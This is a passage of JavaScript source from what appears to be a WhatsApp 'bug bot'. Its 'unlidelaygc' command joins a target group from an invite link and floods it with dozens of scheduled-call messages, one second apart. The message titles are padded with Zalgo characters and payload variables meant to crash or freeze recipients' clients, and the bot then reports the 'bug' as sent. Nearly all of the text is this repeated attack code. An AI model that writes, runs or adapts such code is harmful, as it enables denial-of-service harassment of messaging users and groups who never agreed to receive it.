attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
attention(`👁️‍🗨️̷̤̟̓̇ͤ́=z̓ͥx̗̝̮̅̈v ͉̐̿v̻͙̇iͦͫs̫̰̺i͛on${zetsubonotgay}${ios1}${ios1}`)
await sleep(1000)
}
reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break
case 'unlidelaygc' :  {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let isrum = await zetsubo.groupAcceptInvite(result)
attention = async (teks) => {
let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage" : {
"callType": "AUDIO",
"scheduledTimestampMs": 0,
"title": teks, 
}
}), { userJid: from, quoted: kalgans })
zetsubo.relayMessage(isrum, schedule.message, { messageId: schedule.key.id })
	}
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐒̶̱͞𝐔𖫲𖫲ً͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐔𖫲𖫲ً͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓𝐔𖫲𖫲ً͞𝐁𖫰ꥇً𝚯̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓 ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
attention(`( ˹ ■■■□90% 🌟𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓̸ ᎒ ˺ ) 🏳️😈 ⛂ ﾟ･:*✿ | ( ͡°╭͜ʖ╮͡° ) ˹ ✻ 𝐂̸͜𝐥𝐞͟𝐚𝐧 ً𝐀𝐱𝐨𝐥𝐨𝐭͞𝐥 ◤ ツ ˺$${ios1}${ios1}${mdelay}`)
await sleep(1000)
